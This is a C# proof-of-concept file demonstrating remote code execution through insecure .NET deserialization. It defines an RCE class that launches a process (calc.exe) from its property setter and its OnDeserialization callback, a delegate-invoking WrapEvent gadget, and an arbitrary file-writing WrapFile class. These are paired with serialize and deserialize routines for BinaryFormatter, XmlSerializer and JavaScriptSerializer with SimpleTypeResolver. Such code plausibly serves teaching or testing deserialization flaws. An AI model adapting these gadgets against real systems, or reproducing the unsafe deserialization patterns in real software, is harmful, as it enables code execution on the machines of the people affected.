using System;
using System.IO;
using System.Runtime.Serialization;
using
System.Runtime.Serialization.Formatters.Binary;
using System.Web.Script.Serialization;
using System.Xml.Serialization;

namespace BinarySerialization
{
    public static class BinarySerialization
    {
        private const string filename = "desert.ser";
        [STAThread]
        static void Main(string[] args)
        {
            Console.WriteLine();

            bool deserialize = true;
            if (deserialize)
            { 
                // BinarySerialization.desertDeserial(filename);
                // BinarySerialization.xmlRCEDeserial(filename);
                BinarySerialization.jsonRCEDeserial(filename);
            }
            else
            {
                // Delete old file, if it exists
                BinarySerialization.deleteFile(filename);
                BinarySerialization.desertSerial(filename);
                BinarySerialization.xmlRCESerial(filename);
                BinarySerialization.jsonRCESerial(filename);
            }

            Console.WriteLine();
            Console.WriteLine("Press Enter Key");
            Console.Read();


        }

        public static void deleteFile(string filname)
        {
            if (File.Exists(filename))
            {
                Console.WriteLine("Deleting old file");
                File.Delete(filename);
                File.Delete(filename + ".xml");
                File.Delete(filename + ".json");
            }
        }

        public static void desertDeserial(string filename)
        {
            BinaryFormatter formatter = new BinaryFormatter();
            // Open stream for reading
            MemoryStream stream = new MemoryStream(File.ReadAllBytes(filename));
            Console.WriteLine("Deserializing string");
            // Deserializing
            var desert = (Desert)formatter.Deserialize(stream);
            stream.Close();
        }

        public static void desertSerial(string filename)
        {
            // Create desert name
            //var desert = new Desert();
            //desert.name = "Gobi";
            var desert = new RCE();
            // Persist to file
            FileStream stream = File.Create(filename);
            var formatter = new BinaryFormatter();
            Console.WriteLine("Serializing desert");
            formatter.Serialize(stream, desert);
            stream.Close();
        }

        public static void rceSerial(string filename)
        {
            // Create desert name
            //var desert = new Desert();
            //desert.name = "Gobi";
            var desert = new RCE();
            desert.cmd = "calc.exe";
            // Persist to file
            FileStream stream = File.Create(filename);
            var formatter = new BinaryFormatter();
            Console.WriteLine("Serializing desert");
            formatter.Serialize(stream, desert);
            stream.Close();
        }

        public static void xmlRCEDeserial(string filename)
        {
            filename += ".xml";
            var stream = new FileStream(filename, FileMode.Open, FileAccess.Read);
            var reader = new StreamReader(stream);
            XmlSerializer serializer = new XmlSerializer(typeof(Desert));
            var desert = serializer.Deserialize(reader);
            reader.Close();
            stream.Close();
        }

        public static void jsonRCESerial(string filename)
        {
            filename += ".json";
            var desert = new RCE();
            desert.cmd = "calc.exe";
            // Persist to file
            using (StreamWriter stream = File.CreateText(filename))
            {
                Console.WriteLine("Serializing RCE");
                JavaScriptSerializer serializer = new JavaScriptSerializer(new SimpleTypeResolver());
                stream.Write(serializer.Serialize(desert));
            }
        }

        public static void jsonRCEDeserial(string filename)
        {
            filename += ".json";
            JavaScriptSerializer serializer = new JavaScriptSerializer(new SimpleTypeResolver());
            var stream = new FileStream(filename, FileMode.Open, FileAccess.Read);
            var reader = new StreamReader(stream);
            var desert = serializer.Deserialize<Desert>(reader.ReadToEnd());
            reader.Close();
            stream.Close();
        }

        public static void xmlRCESerial(string filename)
        {
            // Create desert name
            var rce = new RCE();
            // Persist to file
            TextWriter writer = new StreamWriter(filename + ".xml");
            XmlSerializer serializer = new XmlSerializer(typeof(RCE));
            Console.WriteLine("Serializing XML desert");
            serializer.Serialize(writer, rce);
            writer.Close();
        }

        public static void binaryRceSerial(string filename)
        {
            // Create desert name
            //var desert = new Desert();
            //desert.name = "Gobi";
            var desert = new RCE();
            // Persist to file
            FileStream stream = File.Create(filename);
            var formatter = new BinaryFormatter();
            Console.WriteLine("Serializing desert");
            formatter.Serialize(stream, desert);
            stream.Close();
        }

        public static void wrapFileSerial(string filename)
        {
            // Create desert name
            var rce = new RCE();
            // Persist to file
            TextWriter writer = new StreamWriter(filename + ".xml");
            XmlSerializer serializer = new XmlSerializer(typeof(Object));
            Console.WriteLine("Serializing desert");
            serializer.Serialize(writer, rce);
            writer.Close();
        }

    }

    [Serializable]
    public class WrapFile
    {
        string _path;
        string[] _content;
        public WrapFile(string path, string[] content)
        {
            _path = path;
            _content = content;
        }
        public bool Save()
        {
            try
            {
                File.WriteAllText(_path, "");
                File.AppendAllLines(_path, _content);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }

    [Serializable]
    public class WrapEvent : IDeserializationCallback
    {
        Delegate _delegated;
        string _parameters;
        public WrapEvent(Delegate delegated, string parameters)
        {
            _delegated = delegated;
            _parameters = parameters;
        }
        public bool Run()
        {
            return (bool)_delegated.DynamicInvoke(_parameters);
        }

        public void OnDeserialization(object sender)
        {
            Run();
        }
    }

    [Serializable]
    public class RCE : IDeserializationCallback
    {
        private String _cmd = "calc.exe";
        public String cmd
        {
            get { return _cmd; }
            set
            {
                _cmd = value;
                Run();
            }
        }

        public void Run()
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = _cmd;
            p.Start();
            p.Dispose();
        }

        public void OnDeserialization(object sender)
        {
            Run();
        }


    }

    [Serializable]
    public class Desert
    {
        private String _name;

        public String name
        {
            get { return _name; }
            set { _name = value; Console.WriteLine("Desert name: " + _name); }
        }

    }

}